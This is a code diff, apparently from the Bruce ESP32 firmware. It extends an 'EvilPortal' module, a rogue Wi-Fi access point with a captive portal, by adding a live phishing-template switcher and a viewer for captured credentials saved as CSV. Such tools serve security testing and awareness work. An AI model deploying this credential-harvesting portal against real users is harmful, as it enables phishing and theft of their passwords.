@@ -253,6 +253,7 @@ void EvilPortal::restartWiFi(bool reset) {
     vTaskDelay(100 / portTICK_PERIOD_MS);
     wifiDisconnect();
     WiFi.softAP(apName);
+    vTaskDelay(100 / portTICK_PERIOD_MS);
     setupRoutes();
     dnsServer.start(53, "*", WiFi.softAPIP());
     webServer.begin();
@@ -299,6 +300,103 @@ void EvilPortal::loop() {
         if (check(EscPress)) {
             options = {
                 {"Exit Portal", [&exitPortal]() { exitPortal = true; }},
+                {"Change Template", [this, &shouldRedraw]() {
+                    // Save current settings in case user cancels
+                    String oldApName = apName;
+                    String oldOutputFile = outputFile;
+                    bool oldIsDefault = isDefaultHtml;
+                    String oldHtmlFile = htmlFileName;
+                    int oldCredCount = totalCapturedCredentials;
+                    bool oldReturnToMenu = returnToMenu;
+                    returnToMenu = false;
+                    
+                    // Template selection menu (same as startup)
+                    std::vector<Option> templateOptions;
+                    
+                    if (!_verifyPwd) {
+                        templateOptions.push_back({"Default", [this]() { loadDefaultHtml(); }});
+                    } else {
+                        templateOptions.push_back({"Default", [this]() { loadDefaultHtml_one(); }});
+                    }
+                    
+                    templateOptions.push_back({"Custom Html", [this]() { loadCustomHtml(); }});
+                    templateOptions.push_back({"Cancel", [this]() { returnToMenu = true; }});
+                    
+                    loopOptions(templateOptions);
+                    
+                    if (!returnToMenu) {
+                        // If apName is empty after loading custom, prompt for it
+                        if (apName == "") {
+                            if (bruceConfig.evilWifiNames.empty()) {
+                                apName_from_keyboard();
+                            } else {
+                                std::vector<Option> nameOptions;
+                                nameOptions.push_back({"Custom Wifi", [this]() { apName_from_keyboard(); }});
+                                for (const auto &_wifi : bruceConfig.evilWifiNames) {
+                                    nameOptions.emplace_back(_wifi.c_str(), [this, _wifi]() { this->apName = _wifi; });
+                                }
+                                nameOptions.push_back({"Cancel", [this]() { returnToMenu = true; }});
+                                loopOptions(nameOptions);
+                            }
+                        }
+                        
+                        if (!returnToMenu && apName != "") {
+                            // Apply new settings - restart portal with new template
+                            displayTextLine("Applying new template...");
+                            vTaskDelay(500);
+                            
+                            // Clean up old handler
+                            if (_captiveHandler) {
+                                webServer.removeHandler(_captiveHandler);
+                                delete _captiveHandler;
+                                _captiveHandler = nullptr;
+                            }
+                            
+                            // Restart AP with new settings
+                            webServer.end();
+                            dnsServer.stop();
+                            vTaskDelay(100);
+                            
+                            WiFi.softAP(apName, emptyString, _channel);
+                            vTaskDelay(100);
+                            
+                            setupRoutes();
+                            dnsServer.start(53, "*", WiFi.softAPIP());
+                            webServer.begin();
+                            
+                            // Re-add handler
+                            _captiveHandler = new CaptiveRequestHandler(this);
+                            webServer.addHandler(_captiveHandler).setFilter(ON_AP_FILTER);
+                            
+                            displayTextLine("Template changed!");
+                            vTaskDelay(500);
+                        }
+                    }
+                    
+                    if (returnToMenu) {
+                        // User cancelled, restore old settings
+                        apName = oldApName;
+                        outputFile = oldOutputFile;
+                        isDefaultHtml = oldIsDefault;
+                        htmlFileName = oldHtmlFile;
+                        totalCapturedCredentials = oldCredCount;
+                    }
+                    
+                    returnToMenu = oldReturnToMenu;
+                    shouldRedraw = true;
+                }},
+                {"View Creds", [this, &shouldRedraw]() {
+                    FS *fs;
+                    if (getFsStorage(fs)) {
+                        if (fs->exists("/BruceEvilCreds")) {
+                            loopSD(*fs, false, "CSV", "/BruceEvilCreds");
+                        } else {
+                            displayTextLine("No credentials yet");
+                            vTaskDelay(1000);
+                        }
+                    }
+                    shouldRedraw = true;
+                }},
                 {"Resume", [&shouldRedraw]() { shouldRedraw = true; }}
             };
             
@@ -315,12 +413,12 @@ void EvilPortal::loop() {
                 dnsServer.stop();
                 vTaskDelay(100 / portTICK_PERIOD_MS);
                 
-                // Restore original WiFi state
-                if (_originalWifiMode == WIFI_OFF || _originalWifiMode == WIFI_MODE_NULL) {
-                    WiFi.mode(WIFI_OFF);
-                } else {
-                    WiFi.mode(_originalWifiMode);
-                }
+                // Restore original WiFi mode
+                WiFi.mode(_originalWifiMode);
+                vTaskDelay(100 / portTICK_PERIOD_MS);
+                
+                // Disconnect to save battery
+                wifiDisconnect();
                 vTaskDelay(100 / portTICK_PERIOD_MS);
                 
                 return;
